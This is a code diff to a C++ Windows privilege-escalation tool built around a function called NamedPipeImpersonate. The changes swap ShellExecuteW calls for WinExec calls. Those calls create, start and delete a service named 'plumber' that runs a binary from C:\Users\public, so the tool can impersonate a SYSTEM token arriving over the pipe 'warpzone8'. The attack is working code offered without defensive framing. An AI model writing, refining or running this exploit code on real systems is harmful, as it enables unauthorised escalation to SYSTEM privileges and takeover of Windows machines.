@@ -35,6 +35,9 @@ void NamedPipeImpersonate()
     cin.get();
     setProcessPrivs(SE_IMPERSONATE_NAME);
 
+    WinExec("cmd.exe /c sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", 0);
+    
+    /* [Deprecated]
     if (HINSTANCE retVal = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc create plumber binpath= \"C:\\Users\\public\\warpzoneclient.exe\" DisplayName= plumber start= auto", NULL, SW_HIDE))
     {
         printf("[+] Successfully created the service!!!\n");
@@ -43,7 +46,7 @@ void NamedPipeImpersonate()
     {
         printf("[!] There was an error creating the service: %d\n", GetLastError());
     }
-
+    */
     LPCWSTR pipeName = L"\\\\.\\pipe\\warpzone8";
     LPVOID pipeBuffer = NULL;
     HANDLE serverPipe;
@@ -58,6 +61,8 @@ void NamedPipeImpersonate()
     std::wcout << "Creating named pipe " << pipeName << std::endl;
     serverPipe = CreateNamedPipe(pipeName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE, 1, 2048, 2048, 0, NULL);
 
+    WinExec("cmd.exe /c sc start plumber", 0);
+    /* [Deprecated]
     if (HINSTANCE retVal2 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc start plumber", NULL, SW_HIDE))
     {
         printf("[+] Successfully created the service!!!\n");
@@ -66,7 +71,7 @@ void NamedPipeImpersonate()
     {
         printf("[!] There was an error creating the service: %d\n", GetLastError());
     }
-
+    */
     isPipeConnected = ConnectNamedPipe(serverPipe, NULL);
     if (isPipeConnected) {
         std::wcout << "Incoming connection to " << pipeName << std::endl;
@@ -156,6 +161,9 @@ cleanup:
         CloseHandle(pi.hProcess);
     if (pi.hThread)
         CloseHandle(pi.hThread);
+
+    WinExec("cmd.exe /c sc delete plumber", 0);
+    /* [Deprecated]
     if (HINSTANCE retVal3 = ShellExecuteW(NULL, L"open", L"cmd.exe", L"/k sc delete plumber", NULL, SW_HIDE))
     {
         printf("[+] Successfully deleted the service!!!\n");
@@ -164,6 +172,7 @@ cleanup:
     {
         printf("[!] There was an error deleting the service: %d\n", GetLastError());
     }
+    */
 }
 
 
